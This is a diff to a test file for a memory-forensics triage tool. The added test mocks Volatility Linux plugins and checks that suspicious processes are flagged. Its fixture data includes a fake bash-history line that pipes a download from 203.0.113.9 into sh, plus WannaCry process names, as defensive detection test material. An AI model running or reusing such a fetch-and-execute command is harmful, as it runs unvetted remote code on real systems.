@@ -362,7 +362,7 @@ def test_pipeline_reports_aes_keys_without_key_bytes(tmp_path, monkeypatch):
     shared.write_bytes(os.urandom(4096) + lib + os.urandom(4096))
     proc.write_bytes(proc.read_bytes() + lib)
     monkeypatch.setattr(memory, "keyscan_targets", lambda vol: [(816, "@WanaDecryptor@.exe"), (900, "tasksche.exe")])
-    monkeypatch.setattr(memory, "dump_process", lambda d, pid, out: proc if pid == 816 else shared)
+    monkeypatch.setattr(memory, "dump_process", lambda d, pid, out, os_name="windows": proc if pid == 816 else shared)
     db = tmp_path / "t.db"
     pipeline.run(dump, db_path=db, workdir=tmp_path / "out", use_llm=False, log=lambda *a: None)
     from triageguard.store import Store
@@ -406,6 +406,43 @@ def test_score_range_brackets_the_score():
     r = report.score_range(fs)
     assert r["low"]["risk"] <= report.risk_score(fs) <= r["high"]["risk"]
     assert (r["low"]["compromise"], r["high"]["compromise"]) == (40, 69)
+
+
+def test_linux_image_uses_linux_plugins(tmp_path, monkeypatch):
+    from triageguard import memory
+    rows = {
+        "linux.pslist": [{"PID": 1, "PPID": 0, "COMM": "systemd"}, {"PID": 900, "PPID": 1, "COMM": "apache2"},
+                         {"PID": 950, "PPID": 900, "COMM": "sh"}, {"PID": 990, "PPID": 1, "COMM": "kdevd"}],
+        "linux.psaux": [{"PID": 990, "PPID": 1, "COMM": "kdevd", "ARGS": "/dev/shm/.x/kdevd -c conf"}],
+        "linux.sockstat": [{"Process Name": "kdevd", "PID": 990, "Source Addr": "10.0.0.5", "Destination Addr": "203.0.113.9"}],
+        "linux.malware.malfind": [{"PID": 990, "Process": "kdevd", "Start": 4096, "Protection": "rwx",
+                                   "Hexdump": "7f 45 4c 46 02 01 01 00 " + "11 " * 24}],
+        "linux.bash": [{"PID": 950, "Process": "bash", "Command": "curl -s http://203.0.113.9/x | sh"}],
+    }
+
+    def fake(dump, plugin, extra=(), outdir=None):
+        if plugin.startswith("windows."):
+            raise RuntimeError("Unsatisfied requirement plugins.Info.kernel.symbol_table_name")
+        if plugin == "linux.proc.Maps":
+            for start, data in ((0x2000, b"B" * 8), (0x1000, b"A" * 8)):
+                (Path(outdir) / f"pid.990.vma.{start:#x}-{start + 8:#x}.dmp").write_bytes(data)
+            return []
+        return rows[plugin]
+
+    from pathlib import Path
+    monkeypatch.setattr(memory, "_vol", lambda: "vol")
+    monkeypatch.setattr(memory, "run_plugin", fake)
+    res, _ = memory.extract(tmp_path / "linux.lime", tmp_path / "out")
+    assert res["_os"] == "linux" and res["processes"][2]["ImageFileName"] == "sh"
+    assert res["network"][0]["ForeignAddr"] == "203.0.113.9"
+    why = [(f["process"], f["reason"]) for f in memory.suspicious_processes(res)]
+    assert any(p == "sh" and "network service apache2" in r for p, r in why)
+    assert any(p == "kdevd" and "ELF header" in r for p, r in why)
+    assert any("temp folder" in f["reason"] for f in memory.suspicious_processes(res))
+    assert any("bash history" in f["reason"] for f in memory.suspicious_processes(res))
+    assert (990, "kdevd") in memory.keyscan_targets(res)
+    whole = memory.dump_process(tmp_path / "linux.lime", 990, tmp_path / "procs", "linux")
+    assert whole.read_bytes() == b"A" * 8 + b"B" * 8
 
 
 def test_keyscan_targets_pick_ransomware():
